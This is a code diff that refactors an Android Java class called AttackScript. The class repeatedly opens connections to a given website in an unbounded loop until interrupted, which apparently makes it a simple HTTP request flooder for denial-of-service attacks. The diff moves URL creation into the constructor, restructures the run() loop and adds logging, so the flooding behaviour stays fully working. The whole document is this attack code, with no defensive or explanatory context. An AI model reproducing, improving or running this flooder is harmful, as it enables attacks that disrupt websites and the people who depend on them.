@@ -9,25 +9,13 @@ import java.net.URL;
 
 public class AttackScript implements Runnable {
     private static final String TAG = "AttackScript";
-    private String website;
+    private URL url;
 
     public AttackScript(String website) {
-        this.website = website;
+        this.url = createUrl(website);
     }
 
-    @Override
-    public void run() {
-        URL url = createUrl();
-        if (url != null) {
-            while (!Thread.currentThread().isInterrupted()) {
-                Log.d(TAG, "Requesting " + website);
-                readFromUrl(url);
-            }
-            Log.d(TAG, "Stopped requesting from " + website + " server.");
-        }
-    }
-
-    private URL createUrl() {
+    private URL createUrl(String website) {
         URL url = null;
         try {
             url = new URL(website);
@@ -37,10 +25,19 @@ public class AttackScript implements Runnable {
         return url;
     }
 
-    private void readFromUrl(URL url) {
+    @Override
+    public void run() {
+        while (!Thread.currentThread().isInterrupted()) {
+            read(url);
+        }
+        Log.d(TAG, "Stopped requesting from " + url + " server.");
+    }
+
+    private void read(URL url) {
         InputStream in = null;
         try {
             in = url.openStream();
+            Log.d(TAG, "Read from " + url);
         } catch (IOException e) {
             Log.e(TAG, "openStream() error.", e);
         } finally {
@@ -51,6 +48,7 @@ public class AttackScript implements Runnable {
     private void closeInputStream(InputStream in) {
         try {
             in.close();
+            Log.d(TAG, "InputStream closed for " + url);
         } catch (IOException e) {
             Log.e(TAG, "Error while closing the input stream.", e);
         }
